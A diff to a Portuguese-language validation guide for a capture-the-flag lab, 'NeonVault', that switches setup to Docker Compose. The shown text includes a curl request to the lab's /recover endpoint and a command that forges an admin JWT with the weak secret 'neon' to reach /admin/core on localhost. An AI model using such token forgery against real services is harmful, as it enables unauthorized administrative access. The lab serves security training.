@@ -1,4 +1,4 @@
-# Validation — Lab 2 NeonVault
+# Validation — Lab 2 — NeonVault: Cyber Identity Breach
 
 ## Escopo
 
@@ -13,19 +13,17 @@ Nao alterar:
 
 ## Subir aplicacao
 
-Com Node.js:
-
-```bash
-cd ~/ctf-labs/lab-02-neonvault
-npm install
-npm start
-```
-
-Com Docker:
+Docker e o caminho principal de validacao. Nao e necessario ter `npm` instalado no host.
 
 ```bash
 cd ~/ctf-labs/lab-02-neonvault
 docker compose up --build
+```
+
+Para parar ao final:
+
+```bash
+docker compose down
 ```
 
 ## Rotas basicas
@@ -70,7 +68,7 @@ curl -i -X POST http://127.0.0.1:8092/recover -d "username=admin" -d "recovery_c
 JWT forgery:
 
 ```bash
-TOKEN=$(node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
+TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
 curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
 ```
 
